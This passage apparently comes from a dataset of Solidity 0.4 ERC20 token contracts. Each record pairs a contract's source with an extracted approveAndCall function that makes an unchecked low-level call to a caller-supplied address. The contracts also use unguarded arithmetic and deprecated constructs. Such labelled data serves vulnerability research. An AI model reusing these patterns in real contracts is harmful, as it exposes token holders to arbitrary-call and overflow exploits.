{\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract RawToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function RawToken(\n ) {\n balances[msg.sender] = 42000000;\n totalSupply = 42000000;\n name = \"BBK Tobacco & Foods LLP\";\n decimals = 0;\n symbol = \"RAW\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1472"
  },
  "filename": "31548.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BEAMToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BEAMToken(\n ) {\n balances[msg.sender] = 21000000000000000000000000000;\n totalSupply = 21000000000000000000000000000;\n name = \"BEAM\";\n decimals = 18;\n symbol = \"BEAM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1473"
  },
  "filename": "31558.sol",
  "content": "pragma solidity ^0.4.19;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {return false;}\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {return false;}\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract COMMIT is StandardToken {\n function() {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '2.0.0.RELEASE';\n function COMMIT() {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Commit\";\n decimals = 18;\n symbol = \"COMMIT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if (!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {throw;}\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif (!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {throw;}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1474"
  },
  "filename": "31560.sol",
  "content": "pragma solidity ^0.4.19;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {return false;}\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {return false;}\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CHIP is StandardToken {\n function() {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '2.0.0.RELEASE';\n function CHIP() {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Chip\";\n decimals = 18;\n symbol = \"CHIP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if (!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {throw;}\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif (!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {throw;}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1475"
  },
  "filename": "31561.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {return false;}\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {return false;}\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract DUCAT is StandardToken {\n function() {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '2.0.0.RELEASE';\n function DUCAT() {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Ducat\";\n decimals = 18;\n symbol = \"DUCAT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if (!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {throw;}\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif (!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {throw;}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1476"
  },
  "filename": "31562.sol",
  "content": "pragma solidity ^0.4.19;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {return false;}\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {return false;}\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract RESPECT is StandardToken {\n function() {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '2.0.0.RELEASE';\n function RESPECT() {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Sign of Respect\";\n decimals = 18;\n symbol = \"RESPECT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if (!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {throw;}\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif (!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {throw;}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1477"
  },
  "filename": "31564.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract OctusToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n function OctusToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract Octus is OctusToken(2500000000000000000000000, \"Octus\", 18, \"OCT\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1478"
  },
  "filename": "31566.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MinerDog is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MinerDog(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"MinerDogCoin\";\n decimals = 2;\n symbol = \"MDC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1479"
  },
  "filename": "31574.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"ICOIN4U\";\n decimals = 0;\n symbol = \"IC4\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb147a"
  },
  "filename": "31599.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EtherEcash is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EtherEcash(\n ) {\n balances[msg.sender] = 360000000000000000000000000;\n totalSupply = 360000000000000000000000000;\n name = \"EtherEcash\";\n decimals = 18;\n symbol = \"ECH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb147b"
  },
  "filename": "31604.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract EMOToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n string public symbol;\n string public version = 'V0.1';\n uint8 public constant decimals = 18;\n uint256 public constant PRECISION = (10 ** uint256(decimals));\n function EMOToken(\n uint256 _initialAmount,\n string _tokenName,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount * PRECISION;\n totalSupply = _initialAmount * PRECISION;\n name = _tokenName;\n symbol = _tokenSymbol;\n }\n function multisend(address[] dests, uint256[] values) returns (uint256) {\n uint256 i = 0;\n while (i < dests.length) {\n require(balances[msg.sender] >= values[i]);\n transfer(dests[i], values[i]);\n i += 1;\n }\n return(i);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb147c"
  },
  "filename": "31606.sol",
  "content": "pragma solidity ^0.4.0;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SmartcoinsToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SmartcoinsToken(\n ) {\n balances[msg.sender] = 1000000000000;\n totalSupply = 1000000000000;\n name = \"Smartcoins\";\n decimals = 4;\n symbol = \"SMACS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
